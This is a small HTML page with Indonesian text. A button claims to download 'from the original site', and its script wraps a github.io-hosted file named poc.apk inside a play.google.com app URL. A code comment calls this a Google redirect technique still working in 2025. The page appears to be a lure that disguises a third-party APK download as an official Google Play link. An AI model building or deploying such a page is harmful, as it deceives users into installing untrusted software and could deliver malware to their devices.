<html>
<head>
  <meta charset="utf-8">
  <style>
    .button {
      background-color: #4CAF50;
      border: none;
      color: white;
      padding: 15px 32px;
      text-align: center;
      text-decoration: none;
      display: inline-block;
      font-size: 16px;
      margin: 4px 2px;
      cursor: pointer;
      border-radius: 8px;
    }
  </style>
</head>
<body>
  <center>
    <h2>Klik tombol di bawah untuk download dari situs resmi</h2>
    <button class="button" onclick="downloadViaGoogle()">Download From Original Site v3</button>
  </center>

  <script>
    function downloadViaGoogle() {
      // Teknik redirect Google yang masih hidup di 2025
      const apkUrl = encodeURIComponent('https://aliothme.github.io/poc.apk');
      const googleRedirect = `https://play.google.com/store/apps/details?id=com.example&url=${apkUrl}`;
      
      // Buka di tab yang sama atau _blank (keduanya work)
      window.location.href = googleRedirect;
      // atau: window.open(googleRedirect, '_blank');
    }
  </script>
</body>
</html>
